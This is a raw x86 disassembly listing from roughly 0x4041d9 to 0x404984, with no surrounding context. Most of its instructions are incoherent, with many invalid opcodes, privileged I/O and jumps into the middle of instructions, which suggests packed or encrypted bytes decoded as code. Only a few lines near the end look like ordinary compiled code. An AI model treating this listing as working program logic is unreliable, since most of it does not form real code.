  4041d9:	xor    ch,BYTE PTR [edx]
  4041db:	or     bh,BYTE PTR [ecx-0x16]
  4041de:	mov    ah,0xc4
  4041e0:	xor    al,0x5c
  4041e2:	mov    dh,0x16
  4041e4:	das    
  4041e5:	and    eax,0x3c343e53
  4041ea:	cmp    ebp,DWORD PTR [ebx]
  4041ec:	shl    DWORD PTR [ecx],0xc4
  4041ef:	xor    eax,0x6fc1a248
  4041f4:	dec    eax
  4041f5:	or     al,0xfd
  4041f7:	icebp  
  4041f8:	push   eax
  4041f9:	cmc    
  4041fa:	ret    
  4041fb:	jb     0x404272
  4041fd:	mov    ebp,0xb4b1a230
  404202:	push   ds
  404203:	repnz or esp,DWORD PTR ds:[edi-0x684a1b82]
  40420b:	retf   
  40420c:	push   fs
  40420e:	dec    ebp
  40420f:	sbb    al,0x6
  404211:	pop    ss
  404212:	lods   eax,DWORD PTR ds:[esi]
  404213:	xchg   esi,eax
  404214:	mov    ebp,0x2f46758b
  404219:	add    ebx,DWORD PTR [eax+0x0]
  40421c:	and    eax,0x4e3c5382
  404221:	mov    dh,BYTE PTR [eax]
  404223:	jl     0x40428d
  404225:	xchg   DWORD PTR [edx+ebp*1-0x13af34ed],esi
  40422c:	jp     0x40422e
  40422e:	adc    eax,0x82f70e5d
  404233:	inc    esi
  404234:	sbb    BYTE PTR [eax-0x49a84de3],dh
  40423a:	pusha  
  40423b:	iret   
  40423c:	(bad)  [edi+eax*1+0x5f]
  404240:	test   al,0xb7
  404242:	je     0x4041ce
  404244:	push   ecx
  404245:	and    BYTE PTR [ebx],0xc8
  404248:	outs   dx,BYTE PTR ds:[esi]
  404249:	loope  0x40423f
  40424b:	shl    DWORD PTR [ebx-0x55],1
  40424e:	shl    BYTE PTR [ecx],cl
  404250:	fild   WORD PTR [esi]
  404252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404253:	add    eax,0x74926ef0
  404258:	or     DWORD PTR [edi-0x7b],0x70
  40425c:	push   esi
  40425d:	or     BYTE PTR [edx-0x75baa1f3],al
  404263:	sbb    BYTE PTR [edx-0x342b8bc2],dl
  404269:	inc    eax
  40426a:	in     eax,0x1f
  40426c:	data16 icebp 
  40426e:	sbb    ah,BYTE PTR [eax+eiz*2]
  404271:	int3   
  404272:	loope  0x4042b2
  404274:	or     ebp,DWORD PTR [ebp+0x7b284fab]
  40427a:	shr    DWORD PTR [ecx],1
  40427c:	add    ah,BYTE PTR [esi+0x3542a42]
  404282:	mov    bh,0xd6
  404284:	xor    bh,BYTE PTR [esi-0x3952d4ec]
  40428a:	fstp   TBYTE PTR [ecx]
  40428c:	xchg   ebp,eax
  40428d:	inc    eax
  40428e:	test   DWORD PTR [eax-0x7cc65a8e],edx
  404294:	xchg   ecx,eax
  404295:	test   DWORD PTR [edi+ebp*2+0x6cd42bd5],edx
  40429c:	push   0x21ae2977
  4042a1:	pop    edx
  4042a2:	aaa    
  4042a3:	push   es
  4042a4:	add    edi,DWORD PTR [esi]
  4042a6:	jp     0x404271
  4042a8:	retf   
  4042a9:	iret   
  4042aa:	in     al,dx
  4042ab:	test   ch,0xbc
  4042ae:	icebp  
  4042af:	loop   0x4042e9
  4042b1:	test   al,0xd4
  4042b3:	loope  0x4042fa
  4042b5:	dec    esi
  4042b6:	lods   al,BYTE PTR ds:[esi]
  4042b7:	mov    al,ds:0xc342470d
  4042bc:	xchg   ebx,eax
  4042bd:	jne    0x4042d6
  4042bf:	add    edx,ebp
  4042c1:	loop   0x4042c0
  4042c3:	(bad)  
  4042c4:	shl    DWORD PTR [esi-0x14a616a4],cl
  4042ca:	pop    esi
  4042cb:	push   esp
  4042cc:	fldcw  WORD PTR [edi-0x6d]
  4042cf:	xchg   ecx,eax
  4042d0:	xchg   esp,eax
  4042d1:	xor    dl,BYTE PTR [ebp-0x3a]
  4042d4:	in     eax,0xe8
  4042d6:	xor    al,0x6b
  4042d8:	mov    al,0x6c
  4042da:	(bad)  
  4042dc:	shl    BYTE PTR [edx],0xd4
  4042df:	inc    ecx
  4042e0:	test   DWORD PTR [ecx+0x550f1cde],esi
  4042e6:	mov    ebp,0xd7d86d7b
  4042eb:	adc    eax,DWORD PTR [edx-0x7e044b0f]
  4042f1:	mov    esi,0x5a80a3bf
  4042f6:	aad    0xe3
  4042f8:	xor    al,0xf4
  4042fa:	sub    bl,dh
  4042fc:	lods   eax,DWORD PTR ds:[esi]
  4042fd:	jle    0x404308
  4042ff:	addr16 daa 
  404301:	not    BYTE PTR [ecx]
  404303:	mov    bl,BYTE PTR [ecx]
  404305:	pop    ecx
  404306:	xchg   ebp,eax
  404307:	jge    0x404331
  404309:	ins    BYTE PTR es:[edi],dx
  40430a:	sbb    eax,0x47805001
  40430f:	aam    0x86
  404311:	shl    BYTE PTR [eax+eax*2-0x5d647b2b],cl
  404318:	inc    ecx
  404319:	push   ss
  40431a:	call   DWORD PTR [ebx+esi*4-0x1f41b47b]
  404321:	cmp    eax,0xd17b20a3
  404326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404327:	sub    al,0xc
  404329:	push   ebp
  40432a:	jg     0x404348
  40432c:	or     DWORD PTR [esi+0x30],esi
  40432f:	push   esi
  404330:	das    
  404331:	(bad)  
  404332:	mov    WORD PTR [ebp-0x45],?
  404335:	mov    ebx,0x6e6d757e
  40433a:	and    BYTE PTR [ecx+0x2a],ch
  40433d:	push   edx
  40433e:	push   eax
  40433f:	test   eax,0xd8705c1d
  404344:	rcr    BYTE PTR [esp+eiz*4+0x4670ba48],cl
  40434b:	or     ch,BYTE PTR ds:[ebp+0x76]
  40434f:	xchg   ecx,eax
  404350:	(bad)  
  404351:	pop    DWORD PTR [eax+ecx*2]
  404354:	mov    cl,0x40
  404356:	into   
  404357:	xchg   ecx,eax
  404358:	(bad)  
  404359:	rcr    BYTE PTR [ecx+0x1a11cb56],cl
  40435f:	mov    eax,0x44004d9b
  404364:	lods   al,BYTE PTR ds:[esi]
  404365:	xor    dl,al
  404367:	push   edx
  404368:	mov    BYTE PTR [edi+0x6cc22b9e],bh
  40436e:	mov    BYTE PTR [ebx],dl
  404370:	xor    eax,0xad1782de
  404375:	jl     0x4042f7
  404377:	test   BYTE PTR [ebx],0x3c
  40437a:	xor    al,0x7d
  40437c:	jmp    0x404359
  40437e:	fcmovu st,st(0)
  404380:	inc    ebx
  404381:	xchg   edx,eax
  404382:	and    eax,DWORD PTR ds:0x4506bfe1
  404388:	add    edx,DWORD PTR [esi+0x5238cdf3]
  40438e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40438f:	int3   
  404390:	cli    
  404391:	mov    esp,0x98e3a205
  404396:	mov    al,ds:0x9b61ee17
  40439b:	out    dx,eax
  40439c:	dec    edi
  40439d:	jp     0x404370
  40439f:	lea    esp,[ecx-0x5b]
  4043a2:	adc    al,0xc8
  4043a4:	stos   BYTE PTR es:[edi],al
  4043a5:	rcr    BYTE PTR [edi],cl
  4043a7:	mov    esp,0x56c4ff79
  4043ac:	sbb    ebp,DWORD PTR [eax]
  4043ae:	shl    esp,0xb4
  4043b1:	or     eax,0xf9c8cbe
  4043b6:	loope  0x404386
  4043b8:	rcl    BYTE PTR [esi-0x75],cl
  4043bb:	mov    gs,WORD PTR [ebx]
  4043bd:	xchg   ebx,eax
  4043be:	xor    BYTE PTR [esi],ah
  4043c0:	mov    edx,0x8c30ae1
  4043c5:	cmp    eax,esi
  4043c7:	cmp    BYTE PTR [edx],dh
  4043c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ca:	cmp    BYTE PTR [ebp-0x618bd3f3],cl
  4043d0:	dec    edx
  4043d1:	(bad)  
  4043d2:	popf   
  4043d3:	jmp    0x4043be
  4043d5:	pop    edi
  4043d6:	(bad)  [ecx-0x49]
  4043d9:	sub    BYTE PTR [ebx+0xd],bl
  4043dc:	test   BYTE PTR [edx],al
  4043de:	mov    cl,0x57
  4043e0:	sub    dl,BYTE PTR [ebp-0x24]
  4043e3:	in     al,0xc
  4043e5:	enter  0xf67c,0x1f
  4043e9:	xchg   edi,eax
  4043ea:	mov    WORD PTR [esi+ebx*2],cs
  4043ed:	ret    0x785b
  4043f0:	dec    ebp
  4043f1:	ins    DWORD PTR es:[edi],dx
  4043f2:	fs adc al,0xbc
  4043f5:	mov    ebp,0x82760ce1
  4043fa:	sti    
  4043fb:	ins    DWORD PTR es:[edi],dx
  4043fc:	inc    edx
  4043fd:	hlt    
  4043fe:	shr    al,1
  404400:	push   ds
  404401:	shl    edi,cl
  404403:	daa    
  404404:	fisubr DWORD PTR [edx-0x43]
  404407:	cwde   
  404408:	loopne 0x4043e1
  40440a:	sub    dl,BYTE PTR [ebp-0x5e]
  40440d:	out    dx,eax
  40440e:	sti    
  40440f:	stos   BYTE PTR es:[edi],al
  404410:	loope  0x4043b8
  404412:	xor    DWORD PTR [esi],edi
  404414:	jmp    0x40445f
  404416:	enter  0x724e,0x81
  40441a:	sub    ecx,DWORD PTR [ebx+0x386523c3]
  404420:	(bad)  
  404421:	rcl    DWORD PTR [ebx-0x7],cl
  404424:	in     al,dx
  404425:	(bad)  
  404426:	mov    ebp,0x6508b02c
  40442b:	mov    edi,0x3e255376
  404430:	sbb    ebp,DWORD PTR [ebx]
  404432:	jb     0x404432
  404434:	fstp   DWORD PTR [ebx+ebx*2-0x47]
  404438:	push   es
  404439:	sub    eax,0xe8b7ab10
  40443e:	loopne 0x4043c9
  404440:	push   edx
  404441:	fidivr WORD PTR [ebx]
  404443:	sbb    ebp,DWORD PTR [ebp+0x7cb854d]
  404449:	jmp    0x404437
  40444b:	pop    es
  40444c:	xchg   edi,eax
  40444d:	fsubr  DWORD PTR [edx+0x32]
  404450:	in     eax,dx
  404451:	(bad)  
  404452:	call   0x4e0d5ee3
  404457:	inc    ecx
  404458:	pop    ecx
  404459:	inc    edx
  40445a:	pop    ebx
  40445b:	sbb    eax,0x649577cf
  404460:	imul   esi,edx,0x80199abe
  404466:	and    ebp,ebp
  404468:	(bad)  
  40446a:	and    BYTE PTR [edx],al
  40446c:	jae    0x4044bf
  40446e:	fs inc edx
  404470:	pusha  
  404471:	push   ds
  404472:	mov    edx,0xf0de097
  404477:	sub    cl,ah
  404479:	jne    0x404467
  40447b:	pop    es
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044ab
  404490:	dec    ebp
  404491:	and    dl,BYTE PTR [esi+0x5e]
  404494:	sbb    BYTE PTR [esi+0x7e],bh
  404497:	pop    eax
  404498:	jl     0x404518
  40449a:	jle    0x4044c4
  40449c:	rol    DWORD PTR [ecx],1
  40449e:	cmp    BYTE PTR [ebx+ebx*2+0x535cd0de],bh
  4044a5:	add    al,0xf7
  4044a7:	push   es
  4044a8:	xor    BYTE PTR [ebx-0x180d0a3f],dl
  4044ae:	je     0x4044ea
  4044b0:	leave  
  4044b1:	xchg   BYTE PTR [eax+0x32f581db],al
  4044b7:	inc    esi
  4044b8:	push   esp
  4044b9:	call   0x2d9f8a55
  4044be:	jl     0x4044ba
  4044c0:	push   edi
  4044c1:	xor    BYTE PTR [edx],al
  4044c3:	xchg   esp,eax
  4044c4:	dec    esi
  4044c5:	(bad)  
  4044c6:	loopne 0x4044ce
  4044c8:	add    eax,0xf6f2a49e
  4044cd:	push   ebp
  4044ce:	clc    
  4044cf:	sub    al,0x47
  4044d1:	xchg   esp,eax
  4044d2:	xchg   edx,eax
  4044d3:	stos   DWORD PTR es:[edi],eax
  4044d4:	mov    eax,ds:0x3383db0c
  4044d9:	ss cs bound edi,QWORD PTR ss:[eax]
  4044de:	push   ds
  4044df:	lds    esp,FWORD PTR [ebx+0xf]
  4044e2:	or     eax,0xa580a8c4
  4044e7:	dec    bl
  4044e9:	dec    ecx
  4044ea:	pop    eax
  4044eb:	and    bh,ch
  4044ed:	daa    
  4044ee:	jmp    0xa9c35276
  4044f3:	jbe    0x40453a
  4044f5:	mul    DWORD PTR [esi-0x2115a8ee]
  4044fb:	and    al,0x91
  4044fd:	xchg   edx,eax
  4044fe:	cs push edi
  404500:	iret   
  404501:	adc    al,0x6b
  404503:	inc    edx
  404504:	fwait
  404505:	in     al,dx
  404506:	dec    esp
  404507:	imul   esp,DWORD PTR [edx-0x38dbb96c],0xffffffd3
  40450e:	mov    dh,BYTE PTR [ebx+0x153e0538]
  404514:	sub    BYTE PTR [eax+0x11],al
  404517:	int    0x6b
  404519:	pop    edx
  40451a:	mov    ebp,0x6603b586
  40451f:	inc    ebx
  404520:	out    dx,al
  404521:	repnz addr16 pop ecx
  404524:	adc    esp,DWORD PTR [esp+eiz*8-0x3d0dd2c]
  40452b:	cmp    DWORD PTR [ebx-0x4e0ff652],edx
  404531:	out    0x6b,eax
  404533:	bound  esp,QWORD PTR [bp+si]
  404536:	cwde   
  404537:	loope  0x404587
  404539:	sub    DWORD PTR [eax],edx
  40453b:	imul   edi,DWORD PTR [edi+eax*2+0x15ba6261],0xac778814
  404546:	sub    eax,0xee9b8841
  40454b:	aam    0x21
  40454d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454e:	push   0x265364e
  404553:	jp     0x404509
  404555:	call   0xbcb1:0x6343d198
  40455c:	xchg   edi,eax
  40455d:	ret    
  40455e:	mov    bh,0x83
  404560:	cld    
  404561:	cmp    eax,0x51c1347c
  404566:	pop    edx
  404567:	popa   
  404568:	repnz shl esi,0x4
  40456c:	ror    BYTE PTR [edi],cl
  40456e:	pop    esp
  40456f:	dec    ebp
  404570:	stos   BYTE PTR es:[edi],al
  404571:	mov    bl,0x32
  404573:	dec    ecx
  404574:	adc    al,0xf7
  404576:	(bad)
  404579:	mov    ebx,0x53bd17b9
  40457e:	(bad)  
  40457f:	dec    DWORD PTR [esi]
  404581:	sbb    bl,BYTE PTR [edx-0x6055f008]
  404587:	xchg   esi,eax
  404588:	mov    eax,ds:0xac090208
  40458d:	in     al,0x39
  40458f:	add    esi,DWORD PTR [edi]
  404591:	data16 jne 0x4045c7
  404594:	(bad)  
  404595:	cmp    BYTE PTR [ecx-0x628250d8],ch
  40459b:	dec    ecx
  40459c:	fadd   st,st(4)
  40459e:	inc    edi
  40459f:	sahf   
  4045a0:	xchg   ebp,eax
  4045a1:	in     ax,0x2a
  4045a4:	push   0x6b
  4045a6:	and    DWORD PTR [ecx+0x4e087991],edx
  4045ac:	rol    esp,1
  4045ae:	out    dx,al
  4045af:	fcom   QWORD PTR [ebx]
  4045b1:	jmp    0x4045cd
  4045b3:	xlat   BYTE PTR ds:[ebx]
  4045b4:	ins    BYTE PTR es:[edi],dx
  4045b5:	cmp    dh,0x4b
  4045b8:	cmp    ecx,DWORD PTR [ebx-0x7410fd3d]
  4045be:	xchg   esp,eax
  4045bf:	add    esp,ebx
  4045c1:	sbb    DWORD PTR [edx-0x29b9f1fe],ebx
  4045c7:	pushf  
  4045c8:	(bad)  
  4045c9:	jno    0x4045ee
  4045cb:	mov    ecx,0xe46f5eb6
  4045d0:	ja     0x40458b
  4045d2:	fs inc bp
  4045d5:	jns    0x404637
  4045d7:	inc    ebp
  4045d8:	cwde   
  4045d9:	cli    
  4045da:	xchg   ecx,eax
  4045db:	fnstenv [ecx]
  4045dd:	ficomp DWORD PTR [ecx+0x7b]
  4045e0:	daa    
  4045e1:	retf   
  4045e2:	out    dx,eax
  4045e3:	inc    eax
  4045e4:	inc    ebx
  4045e5:	stos   BYTE PTR es:[edi],al
  4045e6:	mov    ah,0xef
  4045e8:	jae    0x404664
  4045ea:	loop   0x404655
  4045ec:	xchg   DWORD PTR [eax+ebp*4+0x326661e2],edi
  4045f3:	mov    ebx,0x65488b12
  4045f8:	sti    
  4045f9:	js     0x4045ff
  4045fb:	add    DWORD PTR [ebx-0x13],ebx
  4045fe:	lahf   
  4045ff:	xor    ah,al
  404601:	mov    cl,0x83
  404603:	mov    bl,0xa7
  404605:	sahf   
  404606:	add    BYTE PTR [esi-0x6548dc8c],ah
  40460c:	pop    ss
  40460d:	cli    
  40460e:	sub    esp,DWORD PTR [edx]
  404610:	inc    eax
  404611:	(bad)  
  404612:	jns    0x40467e
  404614:	sbb    al,0xa0
  404616:	pop    ecx
  404617:	jae    0x4045f1
  404619:	or     eax,0x81329ea6
  40461e:	add    al,0x68
  404620:	(bad)  
  404621:	idiv   BYTE PTR [ebx]
  404623:	into   
  404624:	push   ebp
  404625:	ds adc eax,0x31c1b040
  40462b:	xlat   BYTE PTR ds:[ebx]
  40462c:	cld    
  40462d:	leave  
  40462e:	dec    edi
  40462f:	pop    ss
  404630:	fidiv  WORD PTR [ebp-0x3a]
  404633:	and    ebp,DWORD PTR [edx]
  404635:	cmc    
  404636:	push   cs
  404637:	in     eax,dx
  404638:	xor    edi,DWORD PTR [ecx*2+0x267ccb37]
  40463f:	xor    BYTE PTR [edi+0x60],dh
  404642:	aam    0xc2
  404644:	jmp    FWORD PTR [esi+0x19]
  404647:	inc    ebp
  404648:	mov    ecx,0x244cbe7d
  40464d:	dec    ebp
  40464e:	xlat   BYTE PTR ds:[ebx]
  40464f:	bound  eax,QWORD PTR [ecx]
  404651:	mov    dh,0x11
  404653:	mov    ds:0xbd32b81d,eax
  404658:	push   ss
  404659:	sub    dh,bl
  40465b:	jmp    0x2adbbbfb
  404660:	(bad)  
  404662:	jbe    0x40462d
  404664:	fsubr  QWORD PTR [edi+0x3190b8b6]
  40466a:	mov    al,ds:0x49743144
  40466f:	call   0xe052fc20
  404674:	xlat   BYTE PTR ds:[ebx]
  404675:	jnp    0x4046b5
  404677:	pop    ecx
  404678:	dec    ebx
  404679:	scas   al,BYTE PTR es:[edi]
  40467a:	push   edx
  40467b:	mov    DWORD PTR es:[ebx+edi*1-0x7e9de52e],ebp
  404683:	addr16 xchg bl,bl
  404686:	push   edx
  404687:	xchg   DWORD PTR [ebx+0x11eb3210],ecx
  40468d:	sahf   
  40468e:	jbe    0x404665
  404690:	dec    esi
  404691:	lock mov bh,BYTE PTR [edx]
  404694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404695:	sbb    al,0x4b
  404697:	sub    BYTE PTR [ebp+0x38fe8e32],bl
  40469d:	ja     0x404675
  40469f:	es ret 0xed61
  4046a3:	stos   DWORD PTR es:[edi],eax
  4046a4:	mov    ah,0xc5
  4046a6:	ja     0x404702
  4046a8:	test   edi,edx
  4046aa:	(bad)  
  4046ab:	and    cl,al
  4046ad:	inc    edi
  4046ae:	fnstsw WORD PTR [ebx]
  4046b0:	icebp  
  4046b1:	jle    0x40471a
  4046b3:	ds mov bh,0xbd
  4046b6:	dec    esi
  4046b7:	loope  0x404711
  4046b9:	outs   dx,BYTE PTR ds:[esi]
  4046ba:	adc    al,0xc2
  4046bc:	je     0x40473c
  4046be:	fistp  WORD PTR [esi]
  4046c0:	mov    esi,0x7014dd0e
  4046c6:	jnp    0x4046a6
  4046c8:	sti    
  4046c9:	(bad)  
  4046ca:	sub    eax,0x6ddb9ef3
  4046cf:	xor    dh,bl
  4046d1:	ror    DWORD PTR [eax+0x58],cl
  4046d4:	(bad)  
  4046d5:	pop    ebp
  4046d6:	div    DWORD PTR [ebx-0x80]
  4046d9:	push   eax
  4046da:	cld    
  4046db:	jg     0x404670
  4046dd:	(bad)  
  4046de:	(bad)  
  4046e0:	pop    edx
  4046e1:	mov    al,BYTE PTR [edi+ebx*8-0x55]
  4046e5:	scas   eax,DWORD PTR es:[edi]
  4046e6:	push   edx
  4046e7:	inc    eax
  4046e8:	scas   al,BYTE PTR es:[edi]
  4046e9:	jns    0x404744
  4046eb:	scas   eax,DWORD PTR es:[edi]
  4046ec:	sub    DWORD PTR [ebp-0x46],0x8ebd9c90
  4046f3:	pop    ds
  4046f4:	fwait
  4046f5:	jns    0x4046fd
  4046f7:	cli    
  4046f8:	cmp    eax,0x5535d585
  4046fd:	dec    edi
  4046fe:	leave  
  4046ff:	cs sbb eax,0xd3210a30
  404705:	lahf   
  404706:	sbb    edx,ecx
  404708:	sbb    DWORD PTR [ebx-0x50],ebx
  40470b:	jp     0x4046dd
  40470d:	shr    DWORD PTR [edx],0xd
  404710:	popf   
  404711:	mov    dh,bh
  404713:	mov    WORD PTR [edx],?
  404715:	(bad)  
  404716:	push   esp
  404717:	pop    esi
  404718:	or     al,0xb2
  40471a:	(bad)  
  40471b:	in     al,0x32
  40471d:	jp     0x404717
  40471f:	dec    ecx
  404720:	push   cs
  404721:	mov    edi,0x544b29c8
  404726:	mov    al,ds:0xdad7381f
  40472b:	mov    BYTE PTR ss:[eax-0x41053a71],0x27
  404733:	mov    ecx,0x744d3d16
  404738:	xchg   ecx,eax
  404739:	xor    eax,0xa4e54dd
  40473e:	ins    BYTE PTR es:[edi],dx
  40473f:	xor    cl,ah
  404741:	add    eax,0xa9f1f1f6
  404746:	repnz push eax
  404748:	loop   0x4046f1
  40474a:	jno    0x404793
  40474c:	push   DWORD PTR [ebx]
  40474e:	push   es
  40474f:	imul   edi,DWORD PTR [edx+0x1f853a49],0x5f52586c
  404759:	add    edx,DWORD PTR [ebx-0x4d]
  40475c:	js     0x40472c
  40475e:	popf   
  40475f:	sbb    bh,BYTE PTR [esi-0x24949a14]
  404765:	mov    edx,0x4d8ef62a
  40476a:	loop   0x404719
  40476c:	fcomi  st,st(1)
  40476e:	dec    esi
  40476f:	mov    ecx,DWORD PTR [esp+edx*8]
  404772:	xchg   di,ax
  404774:	popf   
  404775:	pop    edx
  404776:	dec    edi
  404777:	inc    ebp
  404778:	mov    ebx,0xe3116111
  40477d:	xchg   ebx,eax
  40477e:	iret   
  40477f:	imul   ebp,edx,0xf903d033
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	je     0x40479a
  4047b6:	push   ds
  4047b7:	sar    DWORD PTR [eax+0x587e7e27],0x7c
  4047be:	jle    0x40483e
  4047c0:	retf   0xd60f
  4047c3:	pop    ds
  4047c4:	jmp    0x404839
  4047c6:	and    BYTE PTR [edi-0x35],bh
  4047c9:	push   cs
  4047ca:	xchg   edx,eax
  4047cb:	in     eax,dx
  4047cc:	push   ss
  4047cd:	cwde   
  4047ce:	out    0x2b,eax
  4047d0:	jb     0x404784
  4047d2:	xlat   BYTE PTR ds:[ebx]
  4047d3:	sbb    BYTE PTR [eax-0x65f1822e],0x4c
  4047da:	mov    ebx,0xca29cda
  4047df:	jno    0x40478a
  4047e1:	adc    DWORD PTR [edi-0x1ddb1d2e],0xbeffd345
  4047eb:	add    eax,0xe8eaae13
  4047f0:	mov    ch,0x57
  4047f2:	out    dx,eax
  4047f3:	ret    
  4047f4:	sub    ch,BYTE PTR [ecx-0x6721cc3f]
  4047fa:	xchg   BYTE PTR [esp+ebp*1-0x1f],cl
  4047fe:	imul   DWORD PTR [ebx]
  404800:	or     eax,0xecf02b01
  404805:	mov    ch,0x5c
  404807:	adc    dl,dh
  404809:	pop    esi
  40480a:	dec    edi
  40480b:	je     0x404820
  40480d:	xchg   ah,bh
  40480f:	test   eax,0x7fb7e6a7
  404814:	inc    ebp
  404815:	xor    eax,0x39a26d98
  40481a:	push   cs
  40481b:	gs mov ebx,0x632ba2c1
  404821:	fld    QWORD PTR [ebx]
  404823:	pop    es
  404824:	(bad)  
  404825:	sub    al,0x48
  404827:	outs   dx,BYTE PTR ss:[esi]
  404829:	push   esi
  40482a:	push   ebp
  40482b:	push   ds
  40482c:	and    bl,dh
  40482e:	mov    eax,DWORD PTR [eax-0x6c]
  404831:	popa   
  404832:	int3   
  404833:	push   0xfffffff4
  404835:	out    dx,al
  404836:	popa   
  404837:	xor    eax,0x92d7e074
  40483c:	int3   
  40483d:	pop    edi
  40483e:	jmp    0x404889
  404840:	jmp    0x404879
  404842:	adc    dh,dl
  404844:	pop    edx
  404845:	je     0x4048b7
  404847:	in     eax,0x53
  404849:	sti    
  40484a:	push   bp
  40484c:	and    BYTE PTR [ecx-0x39],ah
  40484f:	jb     0x4048a0
  404851:	mov    dh,0xbb
  404853:	addr16 ss mov edi,0xee235743
  40485a:	(bad)  
  40485b:	jmp    0x4048ab
  40485d:	xlat   BYTE PTR ds:[ebx]
  40485e:	cld    
  40485f:	push   ebx
  404860:	fcmove st,st(0)
  404862:	into   
  404863:	xchg   ecx,eax
  404864:	adc    eax,0x92473d91
  404869:	popa   
  40486a:	fst    QWORD PTR [eax-0x36]
  40486d:	test   al,0xf2
  40486f:	sub    ah,BYTE PTR [ecx-0x526926ec]
  404875:	mov    ch,0x1b
  404877:	fdiv   st(7),st
  404879:	mov    ah,0x22
  40487b:	inc    ecx
  40487c:	je     0x404867
  40487e:	enter  0xa421,0xd7
  404882:	(bad)  
  404884:	cwde   
  404885:	dec    ebx
  404886:	std    
  404887:	dec    eax
  404888:	xchg   esp,eax
  404889:	retf   0x7788
  40488c:	push   ds
  40488d:	xchg   BYTE PTR [eax],bl
  40488f:	inc    ebx
  404890:	mov    bh,0x50
  404892:	pop    ecx
  404893:	adc    edi,DWORD PTR [eax]
  404895:	cdq    
  404896:	mov    ebx,0x5501b2b0
  40489b:	shl    DWORD PTR ds:0x1d9b589c,0x54
  4048a2:	(bad)  
  4048a3:	lahf   
  4048a4:	cmp    al,0x4d
  4048a6:	mov    ch,0x36
  4048a8:	pop    ebx
  4048a9:	add    al,0x2c
  4048ab:	xchg   al,ch
  4048ad:	push   ebx
  4048ae:	inc    eax
  4048af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b0:	sub    dl,0x63
  4048b3:	sar    DWORD PTR [edi],cl
  4048b5:	cmp    BYTE PTR [eax+0x4d],cl
  4048b8:	sbb    BYTE PTR [eax+edi*4],bh
  4048bb:	jmp    0x404880
  4048bd:	or     BYTE PTR [ebx],dl
  4048bf:	xchg   ebp,eax
  4048c0:	mov    bh,0x56
  4048c2:	loop   0x4048a0
  4048c4:	(bad)  
  4048c5:	pop    ebp
  4048c6:	jp     0x404873
  4048c8:	jno    0x404904
  4048ca:	loope  0x40486b
  4048cc:	push   ebp
  4048cd:	mov    bl,0xd0
  4048cf:	mov    cl,0x30
  4048d1:	mov    al,ds:0x294d1428
  4048d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d7:	in     al,dx
  4048d8:	clc    
  4048d9:	inc    ebx
  4048da:	jle    0x4048e3
  4048dc:	adc    ch,ch
  4048de:	iret   
  4048df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048e0:	arpl   WORD PTR [edx-0x36b85083],cx
  4048e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e7:	out    dx,eax
  4048e8:	push   es
  4048e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048ea:	aam    0x23
  4048ec:	jp     0x40492a
  4048ee:	sbb    DWORD PTR [edi],ebp
  4048f0:	scas   al,BYTE PTR es:[edi]
  4048f1:	pop    edi
  4048f2:	jns    0x4048ed
  4048f4:	inc    ebx
  4048f5:	jge    0x4048af
  4048f7:	sub    ch,bl
  4048f9:	dec    eax
  4048fa:	cmp    al,0x8b
  4048fc:	les    edi,FWORD PTR [ecx-0x6344ae86]
  404902:	stc    
  404903:	jp     0x4048a0
  404905:	push   ecx
  404906:	or     ah,BYTE PTR [edx+edi*8]
  404909:	shl    DWORD PTR [edi+0xf],1
  40490c:	inc    edx
  40490d:	xchg   ebp,eax
  40490e:	aam    0xd0
  404910:	cmp    al,0x6b
  404912:	bound  ebp,QWORD PTR [edi-0x20]
  404915:	pop    esi
  404916:	cmc    
  404917:	pop    esi
  404918:	inc    edx
  404919:	xchg   edi,eax
  40491a:	adc    eax,0x6bfe0fe9
  40491f:	arpl   WORD PTR [ecx],ax
  404921:	aad    0xd2
  404923:	mov    ds:0x659d331,al
  404928:	and    al,0xb3
  40492a:	inc    ecx
  40492b:	pop    edx
  40492c:	mov    BYTE PTR [ecx+0x722697aa],0x77
  404933:	dec    edi
  404934:	cmc    
  404935:	push   0xeb571dab
  40493a:	fsub   QWORD PTR [ecx-0x6c]
  40493d:	adc    al,0xf3
  40493f:	fwait
  404940:	jecxz  0x404913
  404942:	xor    DWORD PTR [ecx],esi
  404944:	cmp    dh,BYTE PTR [esi-0x40]
  404947:	fidiv  DWORD PTR [ebx-0x472d214b]
  40494d:	fldcw  WORD PTR [ebx+0x79]
  404950:	imul   BYTE PTR [ecx-0x4ef447fd]
  404956:	adc    eax,0xea338c1a
  40495b:	sub    al,0xe4
  40495d:	lods   al,BYTE PTR ds:[esi]
  40495e:	in     al,0xe8
  404960:	faddp  st(2),st
  404962:	jns    0x4049a4
  404964:	sbb    ah,BYTE PTR [edx+0x7c]
  404967:	imul   edx,DWORD PTR [ecx-0x4cb914f7],0xbfc15bdb
  404971:	cwde   
  404972:	push   cs
  404973:	sbb    dl,BYTE PTR [ebp-0x3b6438e6]
  404979:	pop    eax
  40497a:	jecxz  0x4049b0
  40497c:	or     BYTE PTR [esi-0x436c8f2f],ah
  404982:	popf   
  404983:	leave  
  404984:	adc    DWORD PTR [ecx+0x5b7c9553],0x30
